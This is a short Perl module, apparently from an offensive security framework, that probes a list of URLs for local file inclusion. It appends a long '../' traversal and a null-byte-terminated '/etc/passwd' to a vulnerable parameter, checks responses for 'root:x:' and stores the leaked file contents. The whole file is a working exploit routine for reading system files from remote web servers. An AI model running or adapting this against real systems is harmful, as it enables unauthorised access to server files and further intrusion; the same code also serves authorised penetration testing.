package Resources::WebVuln::LFI;
use Nemesis::BaseRes -base;
use Resources::Network::HTTPInterface;

has 'Crawler';
has 'Bug';
has 'Test'      => sub {"/etc/passwd"};
has 'TestRegex' => sub {"root:x:"};


sub test() {
    my $self = shift;
    my @URLS = @_;
    my %Res;
    foreach my $url (@URLS) {
        $self->Init->getIO()->print_info("Trying against $url");
        my $Test
            = "http://"
            . $url
            . $self->Bug
            . "../../../../../../../../../../../../../"
            . $self->Test . '%0000';
        my $response=Resources::Network::HTTPInterface->new->get($Test);
        my $Content = $response->{content};
        my $r       = $self->TestRegex;
        if ( $Content =~ /$r/i ) {
            $Res{$Test}= $Content;
        }
    }
    return %Res;
}

1;
